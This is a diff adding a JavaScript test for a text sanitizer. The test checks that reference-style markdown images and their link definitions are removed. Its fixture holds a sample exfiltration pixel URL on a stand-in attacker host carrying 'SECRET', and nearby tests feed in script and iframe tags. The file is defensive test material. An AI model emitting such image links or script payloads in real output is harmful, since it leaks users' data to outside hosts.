@@ -23,6 +23,23 @@ test('removes markdown images, html images and html comments (exfiltration and m
   assert.match(out, /a .* b .* c .* d/);
 });
 
+test('bugfix: removes reference-style images (full, collapsed, shortcut) and their link definitions', () => {
+  const input = [
+    'full ![proof][leak] done',
+    'collapsed ![leak][] done',
+    'shortcut ![leak] done',
+    '',
+    '[leak]: https://attacker.example/pixel?data=SECRET',
+    '   [other]:   <https://attacker.example/two>  "title"',
+    'but [a normal link](https://example.com/ok) stays',
+  ].join('\n');
+  const out = sanitizeText(input);
+  assert.doesNotMatch(out, /attacker\.example/);
+  assert.doesNotMatch(out, /!\[/);
+  assert.match(out, /\[a normal link\]\(https:\/\/example\.com\/ok\)/);
+  assert.match(out, /full proof done/);
+});
+
 test('removes other html tags such as script and iframe', () => {
   const out = sanitizeText('x <script>alert(1)</script> y <iframe src="//e"></iframe> z');
   assert.doesNotMatch(out, /<script|<iframe/);
